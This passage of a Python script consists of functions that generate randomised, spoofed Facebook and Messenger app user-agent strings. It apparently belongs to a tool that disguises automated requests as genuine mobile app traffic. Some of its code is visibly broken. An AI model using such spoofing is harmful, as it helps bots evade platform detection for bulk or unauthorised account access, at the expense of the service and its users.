"Infinix_X603", "Infinix_X603", "Infinix_X603-LTE", "Infinix_X620B", "Infinix_X620", "Infinix_X6515"])
    sim = random.choice(["Verizon","T-Mobile","Visible","US Mobile","Mint Mobile","Boost Mobile","Xfinity"])
    sim1 = random.choice(["Verizon","T-Mobile","Visible","US Mobile","Mint Mobile","Boost Mobile","Xfinity"])
    density = random.choice(["1.5","2.0","3.0"])
    width = random.choice(["540","720","1080"])
    height = str(random.randrange(999,2480))
    density1 = random.choice(["1.5","2.0","3.0"])
    width1 = random.choice(["540","720","1080"])
    height1 = str(random.randrange(999,2480))
    user_agent = f"[FBAN/FB4A;FBAV/"+str(app_ver)+";FBBV/"+str(app_ver_code)+";FBDM/"+"{density="+str(density)+",width="+str(width)+",height="+str(height)+"};FBLC/en_US;FBCR/"+str(sim)+";FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/"+str(model)+";FBSV/"+str(and_ver)+";FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FB4A/;FBAV/YZWSES93;FBBV/342657617;FBAN/FB4A;FBAV/YZWSES93;FBBV/342657617;FBDM//*{density=3.0,width=1080,height=2560};FBLC/ja_JP;FBRV/554638314;FBCR/TECNO;FBMF/Xiaomi;FBBD/Megagate;FBPN/com.facebook.katana;FBDV/Motorola_Moto_G200;FBSV/16;FBOP/6;FBCA/armeabi;]"
    user_agents.append(f'"{user_agent}"')
    return user_agent

def userag2():
    fb_v1=str(random.choice(range(111,555)))
    fb_v2=str(random.choice(range(111,555)))
    rdp1=str(random.choice(range(111111111,433333333)))
    rdp2=str(random.choice(range(111111111,433333333)))
    andv=str(random.choice(range(8,12)))
    ua="Dalvik/2.1.0 (Linux; U; Android "+andv+".1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/"+fb_v1+".0.0.16."+fb_v2+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+rdp1+";FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/"+andv+".1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920"
    return ua

def fuckx():
    model = random.choice(["SM-J200H", "SM-J320H", "SM-J400F", "SM-J510H", "SM-G570F", "SM-J600FN", "SM-J710F", "SM-J730F", "SM-J810M", "SM-N950X", "SM-A013F", "SM-A500M", "SM-A515F"])
    ufff = "[FBAN/FB4A;FBAV/451.0.0.45.109;FBBV/449217850;[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/"+"{density=3.0,width=1080,height=1920}"+f";FBLC/en_US;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    return ufff

def __fuck1__():
    model = random.choice(["CPH1931","CPH1803","CPH1909","CPH1901","PDBM00","CPH2083"])
    ufff = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/"+"{density=2.0,width=720,height=1456}"+f";FBLC/en_US;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/{model};FBSV/8.1.0;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
    return ufff
    
def __fuck2__():
    model = random.choice(["RMX2185","RMX2189","RMX2180","RMX2101","RMX3063","RMX3201","RMX3193","RMX2151","RMX3085","RMX2193"])
    ufff = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/"+"{density=2.25,width=720,height=1400}"+";FBLC/en_Qaau_US;FBRV/369757394;FBCR/Grameenphone;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/1;FBCA/arm64-v8a:;]"
    return ufff

def generate_realistic_ua():
    brands = ["Redmi Note", "Vivo", "Samsung", "Realme", "OnePlus"]
    brand = random.choice(brands)
    ver = f"{random.randint(200,350)}.0.0.{random.randint(0,99)}.{random.randint(0,99)}"
    build = f"QKQ1.{random.randint(111111,999999)}"
    android = random.randint(6,13)
    model = f"{brand} {random.randint(4,12)} Pro"
    return f"Dalvik/2.1.0 (Linux; U; Android {android}; {model} Build/{build}) [FBAN/FB4A;FBAV/{ver};FBLC/en_US;FBBV/{random.randint(100000,300000)};FBCR/NT;FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{model};FBSV/{android};FBOP/1;FBCA/armeabi-v7a:armeabi]"

def x1():
    END = "[FBAN/FB4A;F"+"BAV/"+"106"+".0.0.26.68;FBBV/"+"106;F"+"BDM/{"+"density="+"3.0,wid"+"th=750"+",height=1334};FBLC/it_"+"IT;FBRV/106."+"0.0.26.6"+"8;FBCR/Etisalat"+"Afg"+"hanistan;FBMF/Infi"+"nix_"+"Note_8i;FBBD/Infi"+"nix_Note_8i;FBPN/c"+"om.facebook.katana"+";FBDV/I"+"nfinix_Note_8i_10_0;FBSV/10.0;FBOP/1;FBCA/"+"x86:armeabi-v7a;]"
    ua = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";"+END
    return ua

def _____useragent_____():
    ____sexua____ = ["[FBAN/FB4A;FBAV/527.0.0.13.76;FBBV/464411764;FBDM={density=2.69,width=720,height=1612};FBLC/fr_DZ;FBRV/194365196;FBCR/Ooredoo;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2603;FBSV/13;FBOP/1;FBCA/arm64-v8a:armeabi;]","[FBAN/FB4A;FBAV/527.0.0.0.38;FBBV/464405122;FBDM={density=3.94,width=1080,height=2412};FBLC/ar_DZ;FBRV/194359768;FBCR/Djezzy;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX3851;FBSV/14;FBOP/1;FBCA/armeabi-v7a:armeabi;]"]
    ____ua____ = f"[FBAN/FB4A;FBAV/{random.randint(11,99)}.0.0.{random.randint(1111,9999)};FBBV/{random.randint(1111111,9999999)};{random.choice(____sexua____)}"
    return ____ua____

def ethan_update_m2():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/388.0.0.32.105;FBBV/317616396;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9070;FBSV/2.3.6;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/316215288;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/FBCR/Teletalk;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1024;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    c = ";[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/FBCR/Grameenphone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1721;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/316215288;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/FBCR/Teletalk;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1024;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    d = ";[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/315414711;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Airtel;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/Orca-Android;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=2.5,width=720,height=1280};FBLC/en_BD;FBCR/null;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH1893;FBSV/10;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi;]"
    ethan_ua_fire = a+b+c+d
    return ethan_ua_fire

def ethan_update_m5():
    fbav1 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
    fbbv1 = str(random.randint(111111111, 999999999))
    density1 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width1 = random.choice(['720', '1080'])
    height1 = random.choice(['2400', '2340', '2560'])
    fblc1 = random.choice(['en_GB'])
    fbrv1 = str(random.randint(333333333, 999999999))
    fbcr1 = random.choice(['Vodafone', 'Null', 'Teletalk', 'AT&amp-T', 'Skitto', 'Zong', 'Banglalink', 'null', 'Robi', 'MTS RUS', 'Airtel', 'Marshmallow', 'Grameenphone'])
    fbmf1 = 'samsung';fbbd1 = 'samsung'
    fbdv1 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv1 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb1=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban1=fb1.split('|')[1];fbpn1=fb1.split('|')[0]
    bit1 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    agent1 = '[FBAN/'+str(fban1)+';FBAV/'+str(fbav1)+';FBBV/'+str(fbbv1)+';FBDM/{density='+str(density1)+',width='+str(width1)+',height='+str(height1)+'};FBLC/'+str(fblc1)+';FBRV/'+str(fbrv1)+';FBCR/'+str(fbcr1)+';FBMF/'+str(fbmf1)+';FBBD/'+str(fbbd1)+';FBPN/'+str(fbpn1)+';FBDV/'+str(fbdv1)+';FBSV/'+str(fbsv1)+';'+str(bit1)+''
    iphone1 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/158.0.0.44.98;FBBV/90997758;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/en_US;FBOP/5;FBRV/90997758]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/672970693;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/674179525;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBIOS;FBAV/151.0.0.61.202;FBBV/82156572;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/SFR;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/83160404]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534883268;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5;FBRV/537932531]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 [FBAN/FBIOS;FBAV/441.1.0.27.105;FBBV/539464914;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/541069100]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/276.0.0.32.107;FBBV/235827610;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/469153370;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/471145542]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/627850395;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/630494309;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/174.0.0.48.98;FBBV/110921384;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/3;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/112241032]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/159.0.0.48.97;FBBV/91994325;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/92489346]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 [FBAN/FBIOS;FBAV/155.0.0.36.93;FBBV/87992437;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.1.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/89136215]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBAV/182.0.0.42.80;FBBV/118457561;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/POST;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/119485025]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/165.0.0.74.96;FBBV/100174821;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100948865]'])
    fbav2 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
    fbbv2 = str(random.randint(111111111, 999999999))
    density2 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width2 = random.choice(['720', '1080'])
    height2 = random.choice(['2400', '2340', '2560'])
    fblc2 = random.choice(['en_GB'])
    fbrv2 = str(random.randint(333333333, 999999999))
    fbcr2 = random.choice(['Vodafone', 'Null', 'Teletalk', 'AT&amp-T', 'Skitto', 'Zong', 'Banglalink', 'null', 'Robi', 'MTS RUS', 'Airtel', 'Marshmallow', 'Grameenphone'])
    fbmf2 = 'samsung';fbbd2 = 'samsung'
    fbdv2 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv2 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb2=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban2=fb2.split('|')[1];fbpn2=fb2.split('|')[0]
    bit2 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    agent2 = '[FBAN/'+str(fban2)+';FBAV/'+str(fbav2)+';FBBV/'+str(fbbv2)+';FBDM/{density='+str(density2)+',width='+str(width2)+',height='+str(height2)+'};FBLC/'+str(fblc2)+';FBRV/'+str(fbrv2)+';FBCR/'+str(fbcr2)+';FBMF/'+str(fbmf2)+';FBBD/'+str(fbbd2)+';FBPN/'+str(fbpn2)+';FBDV/'+str(fbdv2)+';FBSV/'+str(fbsv2)+';'+str(bit2)+''
    iphone2 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/158.0.0.44.98;FBBV/90997758;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/en_US;FBOP/5;FBRV/90997758]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/672970693;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/674179525;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBIOS;FBAV/151.0.0.61.202;FBBV/82156572;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/SFR;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/83160404]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534883268;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5;FBRV/537932531]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 [FBAN/FBIOS;FBAV/441.1.0.27.105;FBBV/539464914;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/541069100]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/276.0.0.32.107;FBBV/235827610;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/469153370;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/471145542]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/627850395;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/630494309;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/174.0.0.48.98;FBBV/110921384;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/3;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/112241032]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/159.0.0.48.97;FBBV/91994325;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/92489346]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 [FBAN/FBIOS;FBAV/155.0.0.36.93;FBBV/87992437;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.1.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/89136215]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBAV/182.0.0.42.80;FBBV/118457561;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/POST;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/119485025]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/165.0.0.74.96;FBBV/100174821;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100948865]'])
    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(['en_GB'])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(['Vodafone', 'Null', 'Teletalk', 'AT&amp-T', 'Skitto', 'Zong', 'Banglalink', 'null', 'Robi', 'MTS RUS', 'Airtel', 'Marshmallow', 'Grameenphone'])
    fbmf3 = 'samsung';fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb3=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    agent3 = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
